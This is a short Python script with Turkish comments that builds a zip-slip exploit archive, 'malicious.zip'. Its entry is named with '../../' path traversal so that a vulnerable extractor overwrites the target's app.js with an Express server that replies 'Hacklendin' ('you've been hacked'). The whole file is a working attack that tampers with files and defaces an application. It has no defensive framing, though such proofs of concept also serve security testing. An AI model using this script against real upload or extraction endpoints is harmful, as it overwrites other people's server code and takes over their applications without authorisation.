import zipfile

zip_file = "malicious.zip"

# ZIP içindeki kötü amaçlı dosya (.. ile üst dizine çıkıp çalıştırılabilir)
malicious_file = "../../app.js"

# ZIP içine yerleştirilecek gerçek kod
app_js_code = """ 
import express from "express";
import dotenv from "dotenv";

dotenv.config();

// MongoDB'ye bağlan

const app = express();
const PORT = process.env.PORT || 3000;



app.get("/", (req, res) => {
  res.json({
    message: `
     Hacklendin
    `,
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

"""

with zipfile.ZipFile(zip_file, "w", zipfile.ZIP_DEFLATED) as zipf:
    zipf.writestr(malicious_file, app_js_code)  # ZIP içine kodu ekle

print(f"{zip_file} oluşturuldu. ZIP açıldığında app.js yerleştirilecek!")
